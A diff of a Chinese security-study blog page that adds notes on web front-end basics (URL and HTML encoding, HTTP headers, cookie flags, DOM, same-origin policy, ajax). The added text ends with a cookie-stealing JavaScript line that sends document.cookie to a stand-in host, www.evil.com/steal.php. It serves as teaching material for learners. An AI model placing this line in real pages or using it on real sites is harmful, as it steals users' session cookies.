@@ -79,16 +79,18 @@
 
 
 
-<meta name="description" content="内容主要选自《Web前端黑客技术揭秘》的前端基础 标准w3c，万维网联盟，web世界的很多推荐标准由其制定，但有些网站可能没有严格执行，有些浏览器也不一定完全遵循，因此会出现“不兼容”问题 URL统一资源定位符，通常所说的链接，通过URL可以查询到唯一资源需要注意其编码和解析方式">
+<meta name="description" content="内容主要选自《Web前端黑客技术揭秘》的前端基础">
 <meta property="og:type" content="article">
 <meta property="og:title" content="《白帽子讲Web安全》学习二">
 <meta property="og:url" content="http://yoursite.com/2020/03/18/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E4%BA%8C/index.html">
 <meta property="og:site_name" content="eAzure">
-<meta property="og:description" content="内容主要选自《Web前端黑客技术揭秘》的前端基础 标准w3c，万维网联盟，web世界的很多推荐标准由其制定，但有些网站可能没有严格执行，有些浏览器也不一定完全遵循，因此会出现“不兼容”问题 URL统一资源定位符，通常所说的链接，通过URL可以查询到唯一资源需要注意其编码和解析方式">
+<meta property="og:description" content="内容主要选自《Web前端黑客技术揭秘》的前端基础">
+<meta property="og:image" content="http://yoursite.com/images/load.gif">
 <meta property="article:published_time" content="2020-03-18T05:17:27.000Z">
-<meta property="article:modified_time" content="2020-03-18T08:32:42.216Z">
+<meta property="article:modified_time" content="2020-03-23T03:26:52.045Z">
 <meta property="article:author" content="eAzure">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/images/load.gif">
 
 
 
@@ -331,9 +333,43 @@
 
       
         <p>内容主要选自《Web前端黑客技术揭秘》的前端基础</p>
+<a id="more"></a>
 <h1 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h1><p>w3c，万维网联盟，web世界的很多推荐标准由其制定，但有些网站可能没有严格执行，有些浏览器也不一定完全遵循，因此会出现“不兼容”问题</p>
-<h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>统一资源定位符，通常所说的链接，通过URL可以查询到唯一资源<br>需要注意其编码和解析方式</p>
-
+<h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>统一资源定位符，通常所说的链接，通过URL可以查询到唯一资源<br>如：<a href="http://www.example.com/path?id=1#next" target="_blank" rel="noopener">http://www.example.com/path?id=1#next</a><br>格式：&lt;协议&gt;://&lt;网络地址(域名/IP)&gt;/&lt;路径&gt;?&lt;查询id=1&gt;#&lt;片段fragment&gt;<br>注意fragment，举个例子：如果example.html的文档中包含一个id属性值为test的元素，那么使用example.html#test这个URL即可直接导航至该元素，将当前页面定位在此处</p>
+<h2 id="编码和解码方式"><a href="#编码和解码方式" class="headerlink" title="编码和解码方式"></a>编码和解码方式</h2><p>参考博客：<br><a href="https://www.cnblogs.com/Wahitler/p/4761373.html" target="_blank" rel="noopener" title="URL编码与解码">URL编码与解码</a><br><a href="https://blog.csdn.net/u014785687/article/details/74078512" target="_blank" rel="noopener" title="不同浏览器中URL的编码方式">不同浏览器中URL的编码方式</a><br><a href="http://www.ruanyifeng.com/blog/2010/02/url_encoding.html" target="_blank" rel="noopener" title="关于URL编码">关于URL编码</a><br>URL只能使用ASCII字符集，所以URL中有中文等其他字符需要进行编码，但是并没有编码的具体标准，所以编码解码都是浏览器来决定的<br>并且有些需要传参的例如?id=1，如果id所包含的内容中含有?等其他特殊字符咋办，这也需要编码</p>
+<h3 id="一些结论"><a href="#一些结论" class="headerlink" title="一些结论"></a>一些结论</h3><p>可能已经不太适用，但提供几个场景供思考</p>
+<ol>
+<li>网址路径的编码，用的是utf-8编码</li>
+<li>查询字符串的编码，用的是操作系统的默认编码</li>
+<li>GET和POST方法的编码，不一定用的是网页的编码；网页里的form编码其实不完全取决于网页编码，form标记中有一个accept-charset属性，在非ie浏览器种，如果将其赋值(比如accept-charset=”UTF-8”)，则表单会按照这个值表示的编码方式进行提交</li>
+<li>在Ajax调用中，IE总是采用GB2312编码（操作系统的默认编码），而Firefox总是采用utf-8编码</li>
+</ol>
+<p>可以这么说不同操作系统、不同浏览器、不同网页字符集将导致完全不同的编码结果，如何保证客户端只用一种编码方式向服务器发送请求？<br>先使用Javascript对URL编码，再向服务器提交，Javascript共有三个编码函数，分别是：escape() encodeURI() encodeURIComponent()</p>
+<h3 id="escape"><a href="#escape" class="headerlink" title="escape()"></a>escape()</h3><p>返回一个字符的Unicode编码<br>具体规则：除了ASCII字母、数字、标点符号”@ * _ + - . /“外，对其他所有字符进行编码，在\u0000与\u00ff之间的符号被转化成%xx的形式，其余符号被转成%uxxxxx的形式<br>解码函数unescape()<br>如”Hello World”的escape()编码就是”Hello%20World”，”春节”的返回结果是”%u6625%u8282”</p>
+<h3 id="encodeURI"><a href="#encodeURI" class="headerlink" title="encodeURI()"></a>encodeURI()</h3><p>对整个URL进行编码，除了ASCII字母、数字、标点符号”‘ ; ? : &amp; $ , # @ * _ + - . /“外，对其他所有字符进行编码，返回utf-8编码，在每个字节前加上%<br>例如”春节”被转化成”%E6%98%A5%E8%8A%82”<br>解码函数decodeURI()<br>它不对单引号编码</p>
+<h3 id="encodeURIComponent"><a href="#encodeURIComponent" class="headerlink" title="encodeURIComponent()"></a>encodeURIComponent()</h3><p>常用于对URL的组成部分编码，”; / ? : @ &amp; = + $ , #”都会被编码<br>解码函数encodeURIComponent()<br>有个小实验：<br>在地址栏里使用百度搜”对+编码”，结果+被认为成空格了<br>而在网页表单中，+就是+</p>
+<h3 id="html编码"><a href="#html编码" class="headerlink" title="html编码"></a>html编码</h3><p>参见博客<br><a href="https://www.freebuf.com/articles/web/55505.html" target="_blank" rel="noopener" title="XSS的原理分析与解剖：第四章（编码与绕过）">XSS的原理分析与解剖：第四章（编码与绕过）</a><br><a href="https://www.freebuf.com/articles/web/43285.html" target="_blank" rel="noopener" title="XSS编码剖析">XSS编码剖析</a><br>实体的编码是&amp;+希腊字母;，例如”&lt;”的编码是”&lt;”<br>字符编码的构造是&amp;#加十进制、十六进制ASCII码或unicode字符编码;浏览器解析时先把html编码解析再渲染，但是该编码必须在属性值里，比如对src属性编码，但是不能对src编码<br>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;ht&amp;# x74;p&amp;#x3a;&#x2F;&#x2F;www.example.com&quot;&gt;可以加载</span><br><span class="line">&lt;img s&amp;# x72;c&#x3D;&quot;http:&#x2F;&#x2F;www.example.com&quot;&gt;不可以加载</span><br></pre></td></tr></table></figure>
+<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p>是一种无状态协议，可以参加我的计算机网络之应用层<br>请求头中的关键点：<br>Host：表明请求主机<br>User-Agent：表明身份，操作系统、浏览器、浏览器内核及对应的版本号等信息<br>Referer：表明从哪个网站点过来的<br>响应头中关键信息：<br>Server：服务端信息，web容器、操作系统、服务端语言及对应的版本等<br>X-Powered-By：里面也会透露服务端语言信息，但该字段有时候会被隐藏起来<br>Content-Type：相应资源的类型与字符集，会影响浏览器对响应体里的资源解析方式<br>Set-Cookie：</p>
+<ol>
+<li>expires：过期时间，如果过期时间在过去，则该Cookie要被删除</li>
+<li>path：相对路径，只有这个路径下的资源可以访问该Cookie</li>
+<li>domain：域名</li>
+<li>HttpOnly：默认无，如果有的话表明Cookie存在于HTTP层面，不能被客户端脚本读取</li>
+<li>Secure：默认无，有的话表明Cookie仅通过HTTPS协议传输</li>
+</ol>
+<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><p>HTML由众多标签组成，标签内有对应的各种属性，标签可不区分大小写，可以不需要闭合，属性的值可以被单引号、双引号、甚至不需要引号围住，多余的空格和Tab不影响解析，html中可以嵌入css、js等不强调分离</p>
+<h2 id="dom树"><a href="#dom树" class="headerlink" title="dom树"></a>dom树</h2><p>html文档就是一个dom树<br>如下所示：<br><img src="/images/load.gif" data-original="/2020/03/18/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E4%BA%8C/1.png" alt="1"></p>
+<p>&lt;html&gt;是树根，其他都是树的每个节点，标签节点以&lt;xxx&gt;表示，属性节点以@xxx表示，文本节点以xxx表示，JavaScript可以对DOM树进行操作</p>
+<h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><p>iframe可以内嵌第三方内容，攻击者可以将iframe嵌入自己的网络木马页面，但是原网页与嵌入的网页间如何互相访问资源呢？如果两网页是同域的话，则可以互相操作dom，但是不同域的话要遵循同源策略，但是嵌入的网页依然可以对原网页的location进行写操作，可以让原网页重定向，但是不能读</p>
+<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><p>控制前端逻辑</p>
+<h2 id="dom树操作"><a href="#dom树操作" class="headerlink" title="dom树操作"></a>dom树操作</h2><ol>
+<li>document对象代表整个dom，例如document.getElementById(‘private_msg’).innerHTML还有document.ccokie</li>
+<li>window.location获取URL地址中的信息</li>
+</ol>
+<p>《JavaScript DOM 编程艺术》</p>
+<h2 id="ajax"><a href="#ajax" class="headerlink" title="ajax"></a>ajax</h2><p>ajax是异步请求，无声无息<br>ajax发出http请求，JavaScript解析响应得到的数据，然后返回给dom树<br>ajax遵守同源策略，除非Access-Control-Allow-Origin之后是*通配符或指定的，表示任意域都可访问</p>
+<h2 id="模拟用户发起浏览器请求"><a href="#模拟用户发起浏览器请求" class="headerlink" title="模拟用户发起浏览器请求"></a>模拟用户发起浏览器请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;新建一个img比安奇对象，对象的src属性指向目标地址</span><br><span class="line">new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&#x2F;steal.php&quot;+escape(document.cookie);</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -450,7 +486,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -461,7 +497,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -506,7 +542,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#标准"><span class="nav-number">1.</span> <span class="nav-text">标准</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#URL"><span class="nav-number">2.</span> <span class="nav-text">URL</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#标准"><span class="nav-number">1.</span> <span class="nav-text">标准</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#URL"><span class="nav-number">2.</span> <span class="nav-text">URL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#编码和解码方式"><span class="nav-number">2.1.</span> <span class="nav-text">编码和解码方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一些结论"><span class="nav-number">2.1.1.</span> <span class="nav-text">一些结论</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#escape"><span class="nav-number">2.1.2.</span> <span class="nav-text">escape()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#encodeURI"><span class="nav-number">2.1.3.</span> <span class="nav-text">encodeURI()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#encodeURIComponent"><span class="nav-number">2.1.4.</span> <span class="nav-text">encodeURIComponent()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#html编码"><span class="nav-number">2.1.5.</span> <span class="nav-text">html编码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP协议"><span class="nav-number">3.</span> <span class="nav-text">HTTP协议</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTML"><span class="nav-number">4.</span> <span class="nav-text">HTML</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dom树"><span class="nav-number">4.1.</span> <span class="nav-text">dom树</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iframe"><span class="nav-number">4.2.</span> <span class="nav-text">iframe</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JavaScript"><span class="nav-number">5.</span> <span class="nav-text">JavaScript</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dom树操作"><span class="nav-number">5.1.</span> <span class="nav-text">dom树操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ajax"><span class="nav-number">5.2.</span> <span class="nav-text">ajax</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模拟用户发起浏览器请求"><span class="nav-number">5.3.</span> <span class="nav-text">模拟用户发起浏览器请求</span></a></li></ol></li></ol></div>
             
 
           </div>
